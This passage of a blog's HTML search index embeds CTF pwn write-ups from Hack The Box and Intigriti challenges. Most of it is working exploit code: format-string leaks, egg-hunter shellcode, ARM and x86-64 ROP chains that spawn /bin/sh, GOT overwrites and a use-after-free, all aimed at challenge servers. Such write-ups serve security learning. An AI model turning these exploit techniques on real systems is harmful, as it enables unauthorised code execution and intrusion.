&lt;li&gt;&lt;code&gt;hoax()&lt;/code&gt; did &lt;code&gt;makeAddr()&lt;/code&gt; and &lt;code&gt;vm.deal()&lt;/code&gt; both&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.txGasPrice()&lt;/code&gt; set gas for the transaction&lt;/li&gt;
&lt;/ul&gt;
">quick notes for blockchain</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/htb_challenges/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;racecar&#34;&gt;racecar:&lt;/h3&gt;
&lt;p&gt;fmtstr to leak the flag on stack&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./racecar&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,31520)
elf=ELF(&amp;quot;./racecar&amp;quot;)

# flag \x0b\x0f 

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Nickname: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;aaaa%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x.%19$x.%20$x.%21$x.%22$x.aaaa&amp;quot;)

io.recvuntil(b&amp;quot;aaaa&amp;quot;)
raw_data=io.recvuntil(b&amp;quot;aaaa&amp;quot;,drop=True)
print(&amp;quot;raw_data: &amp;quot;,raw_data)

flag=&amp;quot;&amp;quot;

nums=[&amp;quot;7b425448&amp;quot;,&amp;quot;5f796877&amp;quot;,&amp;quot;5f643164&amp;quot;,&amp;quot;34735f31&amp;quot;,&amp;quot;745f3376&amp;quot;,&amp;quot;665f3368&amp;quot;,&amp;quot;5f67346c&amp;quot;,&amp;quot;745f6e30&amp;quot;,&amp;quot;355f3368&amp;quot;,&amp;quot;6b633474&amp;quot;,&amp;quot;7d213f&amp;quot;]

for strs in nums:
    i = len(strs)-2
    while i &amp;gt;= 0:
        num = strs[i:i+2]
        print(chr(int(num,16)),end=&amp;quot;&amp;quot;)
        i = i-2

# print(&amp;quot;flag: &amp;quot;,flag)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;hunting&#34;&gt;Hunting:&lt;/h3&gt;
&lt;p&gt;have rwx on stack , while there is some limitation&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x20 0x00 0x00 0x00000000  A = sys_number
 0002: 0x35 0x0a 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0013
 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013
 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013
 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013
 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and it has read the flag on a random addr start from &lt;code&gt;0x5FFFFFFF&lt;/code&gt; ,&lt;br&gt;
choose egg hunting as the trick to solve this , basically modified the original asm from &lt;a href=&#34;https://gist.githubusercontent.com/AdityaChaudhary/fc1bfd0a49e8fc299e76dfbcf69e0100/raw/cc887d1f2c6843cd30695e727c9b27c27352077d/egg_hunter.asm&#34;&gt;here&lt;/a&gt;&lt;br&gt;
modified version:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;global _start


section .text


_start:
  push 0x80                
  pop ebx                 ; time 
  push 0x1b               ; system call number (sys_alarm)
  pop eax
  int 0x80                ; call kernel
  mov edi, dword 0x7b425448  ; EGG {BTH
  mov edx, 0x5FFFFFFF        ; start addr

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  xor ecx, ecx            ; access arg2 -&amp;gt; 0
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  mov al, 0x21            ; access systemcall
  int 0x80
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs
  cmp [edx], edi          ; compare 1st egg
  jnz next_address        ; jump to next address if NOT egg
  push 0x1
  pop ebx           ; stdout
  mov ecx, edx      ; address to write
  push 0x50
  pop edx           ; length
  mov	al, 0x4		; system call number (sys_write)
  int	0x80		; call kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then we use following commands to dump the shellcode&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nasm -f elf32 -o egg.o egg.asm
ld -m elf_i386 egg.o -o egg
objdump -d ./egg | grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&amp;quot;/&#39;|sed &#39;s/$/&amp;quot;/g&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./hunting&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,31599)
elf=ELF(&amp;quot;./hunting&amp;quot;)

shellcode=b&amp;quot;\x68\x80\x00\x00\x00\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x6a\x01\x5b\x89\xd1\x6a\x50\x5a\xb0\x04\xcd\x80&amp;quot;

# gdb.attach(io)
# pause()

io.send(shellcode)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;oxidized-rop&#34;&gt;Oxidized ROP&lt;/h3&gt;
&lt;p&gt;written by rust , logical vuln and how rust parse our input are key to this chall&lt;br&gt;
in a word we need to fulfil the check&lt;br&gt;
&lt;code&gt;0x55f494f01897 &amp;lt;oxidized_rop::present_config_panel+7&amp;gt;     cmp    dword ptr [rdi], 1e240h&lt;/code&gt;&lt;br&gt;
and the low bytes of &lt;code&gt;[rdi]&lt;/code&gt; will be replaced by a unicode we input in option1 , use the following&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# **𞉀**

## U+1E240

### [0x1E240](https://numeral.bayashi.net/0x1E240 &amp;quot;𞉀 - 0x1E240&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./oxidized-rop&amp;quot;)
# io=remote(&amp;quot;159.65.20.166&amp;quot;,30248)
elf=ELF(&amp;quot;./oxidized-rop&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;Selection: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot; (max 200 characters): &amp;quot;,&amp;quot;𞉀&amp;quot;*199)
io.sendlineafter(b&amp;quot;Selection: &amp;quot;,b&amp;quot;2&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;arms-roped&#34;&gt;Arms roped:&lt;/h3&gt;
&lt;p&gt;annoying chall without correct libc in docker , 0 out of 10 😅😅😅&lt;br&gt;
several points need to mention:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\x00&lt;/code&gt; cut off when leaking addr&lt;/li&gt;
&lt;li&gt;ARM instruction alignment&lt;/li&gt;
&lt;li&gt;disturbing offsets 😅😅😅&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
# remote_addr = [&amp;quot;167.99.82.136&amp;quot;,32375]
remote_addr = [&amp;quot;167.99.85.216&amp;quot;,31954]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./arms_roped&amp;quot;]) 
    elf = ELF(&amp;quot;./arms_roped&amp;quot;)
    # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # io = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        io = remote(remote_addr[0],remote_addr[1])
        elf = ELF(&amp;quot;./arms_roped&amp;quot;)
        # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

### leak canary
payload=b&amp;quot;a&amp;quot;*0x21
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x21)
canary=u32(io.recv(3)[-4:].rjust(4,b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))


### leak base
payload=b&amp;quot;a&amp;quot;*0x30
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x30)
# base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))+0x40000000-0x948
base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-0x948
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))


### leak libc
payload=b&amp;quot;a&amp;quot;*0x48
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x48)
leak_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-153-0x1748C
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

# sys_addr=leak_addr+0x2F5C8 9.9
sys_addr=leak_addr+0x2F510+1  # alignment
### 0002F510

# str_sh=leak_addr+0x0DCE38 9.9
str_sh=leak_addr+0x0DCE0C
### 00DCE0C

log.success(&amp;quot;sys_addr: &amp;quot;+hex(sys_addr))
log.success(&amp;quot;str_sh: &amp;quot;+hex(str_sh))


# 0x000009ec: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x000009d8: mov r0, r7; add r4, r4, #1; blx r3;
# 0x0000056c: pop {r3, pc};

mov_all=base_addr+0x9d8
pop_r4_r5_r6_r7_r8_sb_sl_pc=base_addr+0x9ec
pop_r3_pc=base_addr+0x56c


log.success(&amp;quot;mov_all: &amp;quot;+hex(mov_all))
log.success(&amp;quot;pop_r4_r5_r6_r7_r8_sb_sl_pc: &amp;quot;+hex(pop_r4_r5_r6_r7_r8_sb_sl_pc))
log.success(&amp;quot;pop_r3_pc: &amp;quot;+hex(pop_r3_pc))


payload=cyclic(0x20)+p32(canary)+p32(0xdeadbeef)*3
payload+=p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)

payload+=p32(0)*3
payload+=p32(str_sh) # r7-&amp;gt;str_sh
payload+=p32(0)*3
payload+=p32(pop_r3_pc)

payload+=p32(sys_addr)+p32(mov_all)

io.sendline(payload)

# io.sendline(b&amp;quot;quit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HTB_Challenges</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/shHGM9hmT/"" data-c="
          &lt;h2 id=&#34;tldr&#34;&gt;TL;DR：&lt;/h2&gt;
&lt;p&gt;nothing here.&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;pwn_great_old_talisman&#34;&gt;pwn_great_old_talisman:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;no check for the input, we could use this to perform a oob write&lt;/li&gt;
&lt;li&gt;overwrites the low 2bytes of &lt;code&gt;exit@got[plt]&lt;/code&gt; to that of  &lt;code&gt;read_flag&lt;/code&gt; func&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./great_old_talisman&amp;quot;)
io=remote(&amp;quot;94.237.54.197&amp;quot;,53139)
elf=ELF(&amp;quot;./great_old_talisman&amp;quot;)
libc=elf.libc

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(-4))

io.sendafter(b&amp;quot;Spell: &amp;quot;,b&amp;quot;\x5a\x13&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pwn_zombienator&#34;&gt;pwn_zombienator:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;use &lt;code&gt;delete&lt;/code&gt; to make a libc_addr leakage and we have all the addr we need for rop chain&lt;/li&gt;
&lt;li&gt;in &lt;code&gt;attack&lt;/code&gt; function we have a chance to directly write on the stack , due to the &lt;code&gt;scanf&lt;/code&gt; as input , use &lt;code&gt;+&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt; to not to overwrite until the return addr , to bypass the canary check . And we have our rop chain written on return addr .&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;( be careful when we write our rop chain , it uses &lt;code&gt;scanf(&amp;quot;%lf&amp;quot;)&lt;/code&gt; , so we have to use double formation as input&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./zombienator&amp;quot;)
io=remote(&amp;quot;94.237.58.77&amp;quot;,50672)
elf=ELF(&amp;quot;./zombienator&amp;quot;)
libc=elf.libc

def double_float(value):
    return str(struct.unpack(&#39;!d&#39;, p64(value)[::-1])[0])

def add(s,n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;tier: &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;9): &amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;position: &amp;quot;,str(n))

def show():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

def attack():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)

# gdb.attach(io)
# pause()

for i in range(8):
    add(0x80,i)

add(0x20,8)

for i in range(8):
    delete(i)

show()

io.recvuntil(b&amp;quot;Slot [7]: &amp;quot;)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

pop_rdi=leak_addr+0x2a3e5
# 0x000000000002a3e5: pop rdi; ret;

ret=leak_addr+0xf9e3c
# 0x00000000000f9e3c: ret;

print(&amp;quot;str_sh: &amp;quot;,hex(str_sh))
print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))

rop=[double_float(ret),double_float(pop_rdi),double_float(str_sh),double_float(sys_addr)]

attack()
io.sendlineafter(b&amp;quot;attacks: &amp;quot;,b&amp;quot;39&amp;quot;)

for i in range(35):
    io.sendlineafter(b&amp;quot;coordinates: &amp;quot;,b&amp;quot;+&amp;quot;)

# gdb.attach(io)
# pause()

for i in range(4):
    io.sendlineafter(b&amp;quot;coordinates: &amp;quot;,rop[i])    

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pwn_zombiedote&#34;&gt;pwn_zombiedote:&lt;/h3&gt;
&lt;p&gt;just like the chall before  , this one also uses &lt;code&gt;%lf&lt;/code&gt; as input and it has even &lt;code&gt;%lf&lt;/code&gt; as output , so just write 2 func to perform as &lt;code&gt;encode and decode&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;malloc a huge size to cover as many sections as it can in memory , therefore we can perform a aaw read or write&lt;/li&gt;
&lt;li&gt;one chance for the &lt;code&gt;inspect&lt;/code&gt; function , use it to leak the libc in libc section , the offset needs to be manually tested .&lt;/li&gt;
&lt;li&gt;idk what the intend solution is , I tried to hijack the &lt;code&gt;exit_hook&lt;/code&gt;(I named it , offset tested manually) , where we have access to write to , and it will finally be called in the &lt;code&gt;exit&lt;/code&gt; function , we could overwrite it with &lt;code&gt;one_gadget&lt;/code&gt; , choose the proper one to fulfill the restrictions .&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;83.136.255.126&amp;quot;,55297)
# io=process(&amp;quot;./zombiedote&amp;quot;)
elf=ELF(&amp;quot;./zombiedote&amp;quot;)
libc=elf.libc

def double_float(value):
    return str(struct.unpack(&#39;!d&#39;, p64(value)[::-1])[0])

def double_to_hex(val):
    return int.from_bytes(struct.pack(&amp;quot;d&amp;quot;, val), &amp;quot;little&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;samples: &amp;quot;,str(s))

def insert(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;tested: &amp;quot;,str(s))


def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;number: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;(%): &amp;quot;,double_float(cc))

def show(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;inspect: &amp;quot;,str(s))
    io.recvuntil(b&amp;quot;: &amp;quot;)
    hex_string=double_to_hex(float(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True)))
    print(&amp;quot;hex_string: &amp;quot;,hex(hex_string))
    return hex_string

# gdb.attach(io)

add(0x40040000)
print(&amp;quot;test: &amp;quot;,double_to_hex(1.619794219890527e-319))

### libc_leakage
leak_addr=show(0x40083af0)-0x2197e3
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
exit_hook=leak_addr+0x21a6c8
shell=leak_addr+0xeea9c

pop_rdi=leak_addr+0x2e6c5
# 0x000000000002e6c5: pop rdi; ret;

ret=leak_addr+0x2c7a9
# 0x000000000002c7a9: ret;

# rop_addr=leak_addr-0x200203ff0
# rop=[ret,pop_rdi,str_sh,sys_addr]
insert(0x4)
for i in range(4):
    io.sendlineafter(b&amp;quot;(%): &amp;quot;,double_float(0xdeadbeef))

#  RBX  0x7ffff7fb26c8 (__elf_set___libc_atexit_element__IO_cleanup__) —▸ 0x7ffff7e86a9c (execvpe+652) ◂— mov rdx, r12
#    0x7ffff7de157d &amp;lt;__run_exit_handlers+429&amp;gt;    jae    7ffff7de158bh                 &amp;lt;__run_exit_handlers+443&amp;gt;
#    0x7ffff7de157f &amp;lt;__run_exit_handlers+431&amp;gt;    nop
#  ► 0x7ffff7de1580 &amp;lt;__run_exit_handlers+432&amp;gt;    call   qword ptr [rbx]

# gdb.attach(io)

edit(5,0)
edit(0x40083cd7,shell)
io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

io.interactive()

# 0xeea9c execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeea9f execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeeaa2 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">HTB_University_CTF_2023 </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JbINLA9Ja/"" data-c="
          &lt;h3 id=&#34;tldr&#34;&gt;TL;DR:&lt;/h3&gt;
&lt;p&gt;nothing here .&lt;/p&gt;
&lt;h3 id=&#34;hidden&#34;&gt;Hidden:&lt;/h3&gt;
&lt;p&gt;PIE enabled , partial write is ok , 1/16 chance to meet the 1bit bruteforce , I was too lazy to write the bruteforce script so I&#39;ll just put up the normal one:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;hidden.ctf.intigriti.io&amp;quot;,1337)

# gdb.attach(io)
# pause()

payload=cyclic(0x48)+b&amp;quot;\xd9\x91&amp;quot;
io.sendafter(b&amp;quot;something:\n&amp;quot;,payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;floor-mat-store&#34;&gt;Floor Mat Store:&lt;/h3&gt;
&lt;p&gt;the flag stored on the stack can be leaked through the fsa , the only thing we need to do is to use gdb to make clear the offset , no script need to write&lt;br&gt;
first input 6 to read the flag to the stack , then leak it with &lt;code&gt;%10$s&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1700327407102.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;over-the-edge&#34;&gt;Over The Edge:&lt;/h3&gt;
&lt;p&gt;only provided a socket script to us , the main logic was to use the int overflow to bypass the check . Use the function in original script to help understand .&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
import numpy as np
import warnings
import socket
import threading
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)


io=remote(&amp;quot;edge.ctf.intigriti.io&amp;quot;,1337)

input_data = ((1&amp;lt;&amp;lt;64)-1402)

def process_input(input_value):
    num1 = np.array([0], dtype=np.uint64)
    num2 = np.array([0], dtype=np.uint64)
    num2[0] = 0
    a = input_value
    if a &amp;lt; 0:
        return &amp;quot;Exiting...&amp;quot;
    num1[0] = (a + 65)
    print(&amp;quot;num2[0] =&amp;quot; ,num2[0])
    print(&amp;quot;num1[0] =&amp;quot; ,num1[0])
    print(&amp;quot;num2[0] - num1[0] = &amp;quot;,num2[0]-num1[0])
    if (num2[0] - num1[0]) == 1337:
        return &#39;You won!\n&#39;
    return &#39;Try again.\n&#39;

input_value = int(input_data)
print(&amp;quot;input_value: &amp;quot;,input_value)


response = process_input(input_value)

print(&amp;quot;response: &amp;quot;,response)


io.sendlineafter(b&amp;quot;edge!\n&amp;quot;,str(input_data))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;maltigriti&#34;&gt;Maltigriti:&lt;/h3&gt;
&lt;p&gt;to get the flag we need our report level to be &lt;code&gt;A&lt;/code&gt; and the bounty num to be bigger than the value it gives&lt;br&gt;
there exists an uaf vuln in &lt;code&gt;logout&lt;/code&gt; function , which is key to success&lt;br&gt;
first we created the user with the bio , we could cover some value at the same time(later these values will be the in report structure)&lt;br&gt;
remeber the bio size should be the same as the &lt;code&gt;report chunk size&lt;/code&gt; for the first fit principle&lt;br&gt;
once we created it&lt;br&gt;
and then we use &lt;code&gt;logout&lt;/code&gt; to create the uaf , the next time when we add a new report it&#39;ll be signed on the freed chunk&lt;br&gt;
after that we leak the heap addr with &lt;code&gt;edit&lt;/code&gt; function , we need the heap addr that points to user chunk to fulfill the need of &lt;code&gt;calculate_balance&lt;/code&gt;&lt;br&gt;
meanwhile in  &lt;code&gt;edit&lt;/code&gt; function we have a chance to overwrite the report , fill it with the payload&lt;br&gt;
finally call the &lt;code&gt;buy_swag_pack&lt;/code&gt; function and there should be flag printed&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./maltigriti&amp;quot;)
io=remote(&amp;quot;maltigriti.ctf.intigriti.io&amp;quot;,1337)
elf=ELF(&amp;quot;./maltigriti&amp;quot;)
libc=elf.libc

def reg(s,cc):
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;name&amp;gt; &amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;password&amp;gt; &amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;your bio&amp;gt; &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,cc)
    
def edit_bio():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    # io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,cc)
    
def add_report(c1,c2):
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;title&amp;gt; &amp;quot;,c1)
    io.sendlineafter(b&amp;quot;report&amp;gt; &amp;quot;,c2)
    
def show():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    
def get_flag():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;5&amp;quot;)
    
def uaf():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;6&amp;quot;)
    

# gdb.attach(io)
# pause()

reg(0xc0,b&amp;quot;A&amp;quot;*0x50)
uaf()
add_report(b&amp;quot;A&amp;quot;*0x18,b&amp;quot;A&amp;quot;*0x50)

edit_bio()
io.recvuntil(b&amp;quot;is: &amp;quot;)
ptr_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;ptr_addr: &amp;quot;,hex(ptr_addr))

io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,p64(ptr_addr)+b&amp;quot;A&amp;quot;*0x10)

get_flag()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;reading-in-the-dark&#34;&gt;Reading in the Dark:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;this one was confusing at a period , for a long time I tried to modify the string `story.txt`  but later I found that the section was `read only` lmao
